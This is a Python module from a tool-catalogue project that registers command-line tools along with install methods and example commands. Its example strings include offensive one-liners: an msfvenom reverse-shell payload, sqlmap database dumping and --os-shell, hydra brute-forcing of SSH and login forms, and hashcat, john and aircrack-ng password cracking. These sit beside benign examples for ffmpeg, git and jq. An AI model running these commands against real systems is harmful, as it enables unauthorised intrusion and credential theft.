"""
melvin/tools/registry.py
=========================
Tool catalogue built from config.TOOL_CATEGORIES.

Each entry describes a tool: name, description, category, and the preferred
install method (apt / pip / snap / cargo / manual).
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Dict, List, Optional

from config import TOOL_CATEGORIES, TOOL_INSTALL_OVERRIDES


@dataclass
class ToolEntry:
    name: str
    description: str
    category: str
    apt_pkg: Optional[str] = None       # apt package name (if different from name)
    pip_pkg: Optional[str] = None       # pip package name
    snap_pkg: Optional[str] = None      # snap install argument
    manual_url: Optional[str] = None    # URL / command for manual install
    examples: List[str] = field(default_factory=list)

    @property
    def install_method(self) -> str:
        """Return a human-readable description of the preferred install method."""
        if self.pip_pkg:
            return f"pip install {self.pip_pkg}"
        if self.snap_pkg:
            return f"snap install {self.snap_pkg}"
        if self.manual_url:
            return f"manual: {self.manual_url}"
        pkg = self.apt_pkg or self.name
        return f"apt install {pkg}"

    def apt_command(self) -> List[str]:
        pkg = self.apt_pkg or self.name
        return ["apt", "install", "-y", pkg]

    def pip_command(self) -> List[str]:
        if self.pip_pkg:
            return ["pip", "install", self.pip_pkg]
        return []

    def snap_command(self) -> List[str]:
        if self.snap_pkg:
            return ["snap", "install"] + self.snap_pkg.split()
        return []


# ---------------------------------------------------------------------------
# Pre-baked examples for popular tools
# ---------------------------------------------------------------------------

_EXAMPLES: Dict[str, List[str]] = {
    "nmap": [
        "nmap -sS 192.168.1.1",
        "nmap -A -T4 192.168.1.0/24",
        "nmap -p 80,443,22 -sV 10.0.0.1",
        "nmap -O --osscan-guess 192.168.1.1",
        "nmap -sU -p 53,161 10.0.0.1",
    ],
    "masscan": [
        "masscan -p1-65535 10.0.0.0/8 --rate=1000",
        "masscan -p80,8080 192.168.1.0/24",
    ],
    "sqlmap": [
        "sqlmap -u 'http://target.com/page?id=1' --dbs",
        "sqlmap -u 'http://target.com/page?id=1' -D mydb --tables",
        "sqlmap -u 'http://target.com/page?id=1' -D mydb -T users --dump",
        "sqlmap -u 'http://target.com/page?id=1' --os-shell",
    ],
    "metasploit-framework": [
        "msfconsole",
        "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf > shell.elf",
        "use auxiliary/scanner/portscan/tcp",
    ],
    "ffuf": [
        "ffuf -w /usr/share/wordlists/dirb/common.txt -u http://target.com/FUZZ",
        "ffuf -w users.txt:USER -w passwords.txt:PASS -u http://target.com/login -X POST -d 'user=USER&pass=PASS'",
    ],
    "gobuster": [
        "gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
        "gobuster dns -d target.com -w subdomains.txt",
    ],
    "hydra": [
        "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com",
        "hydra -L users.txt -P passwords.txt ftp://192.168.1.1",
        "hydra -l admin -P wordlist.txt http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'",
    ],
    "hashcat": [
        "hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt",
        "hashcat -m 1000 ntlm_hashes.txt wordlist.txt -r rules/best64.rule",
        "hashcat -m 0 hash.txt -a 3 ?a?a?a?a?a?a",
    ],
    "john": [
        "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt",
        "john --format=md5crypt hashes.txt",
        "john --show hashes.txt",
    ],
    "aircrack-ng": [
        "airmon-ng start wlan0",
        "airodump-ng wlan0mon",
        "airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon",
        "aircrack-ng -w wordlist.txt capture-01.cap",
    ],
    "wireshark": [
        "wireshark",
        "tshark -i eth0 -w capture.pcap",
        "tshark -r capture.pcap -Y 'http'",
    ],
    "tcpdump": [
        "tcpdump -i eth0 -w capture.pcap",
        "tcpdump -r capture.pcap 'port 80'",
        "tcpdump -i any host 192.168.1.1 and port 443",
    ],
    "volatility3": [
        "vol -f memory.dmp windows.pslist",
        "vol -f memory.dmp windows.netscan",
        "vol -f memory.dmp windows.malfind",
    ],
    "theharvester": [
        "theHarvester -d example.com -b all",
        "theHarvester -d example.com -b google,bing -l 200",
    ],
    "sherlock": [
        "sherlock username",
        "sherlock username1 username2 --csv",
    ],
    "ffmpeg": [
        "ffmpeg -i input.mp4 output.avi",
        "ffmpeg -i input.mp4 -vf scale=1280:720 output.mp4",
        "ffmpeg -i input.mp4 -ss 00:01:00 -to 00:02:00 -c copy clip.mp4",
        "ffmpeg -i input.mp4 -an audio_removed.mp4",
    ],
    "yt-dlp": [
        "yt-dlp 'https://www.youtube.com/watch?v=ID'",
        "yt-dlp -f 'bestvideo+bestaudio' 'URL'",
        "yt-dlp -x --audio-format mp3 'URL'",
    ],
    "docker": [
        "docker ps",
        "docker run -it --rm ubuntu bash",
        "docker build -t myimage .",
        "docker-compose up -d",
    ],
    "git": [
        "git clone https://github.com/user/repo.git",
        "git log --oneline --graph --all",
        "git rebase -i HEAD~3",
        "git bisect start",
    ],
    "ripgrep": [
        "rg 'pattern' .",
        "rg -i 'error' /var/log/ --type log",
        "rg -l 'TODO' src/",
    ],
    "jq": [
        "cat data.json | jq '.'",
        "cat data.json | jq '.items[] | .name'",
        "curl -s https://api.github.com/users/torvalds | jq '.public_repos'",
    ],
}


# ---------------------------------------------------------------------------
# Registry builder
# ---------------------------------------------------------------------------

def build_registry() -> Dict[str, List[ToolEntry]]:
    """Return a dict of category -> list of ToolEntry."""
    registry: Dict[str, List[ToolEntry]] = {}

    for category, tools in TOOL_CATEGORIES.items():
        entries: List[ToolEntry] = []
        for name, description in tools:
            override = TOOL_INSTALL_OVERRIDES.get(name, {})
            entry = ToolEntry(
                name=name,
                description=description,
                category=category,
                apt_pkg=override.get("apt"),
                pip_pkg=override.get("pip"),
                snap_pkg=override.get("snap"),
                manual_url=override.get("manual"),
                examples=_EXAMPLES.get(name, [f"{name} --help"]),
            )
            entries.append(entry)
        registry[category] = entries

    return registry


# Singleton – build once at import
REGISTRY: Dict[str, List[ToolEntry]] = build_registry()


def all_tools() -> List[ToolEntry]:
    tools = []
    for entries in REGISTRY.values():
        tools.extend(entries)
    return tools


def find_tool(name: str) -> Optional[ToolEntry]:
    for tool in all_tools():
        if tool.name.lower() == name.lower():
            return tool
    return None


def search_tools(query: str) -> List[ToolEntry]:
    q = query.lower()
    return [
        t for t in all_tools()
        if q in t.name.lower() or q in t.description.lower() or q in t.category.lower()
    ]
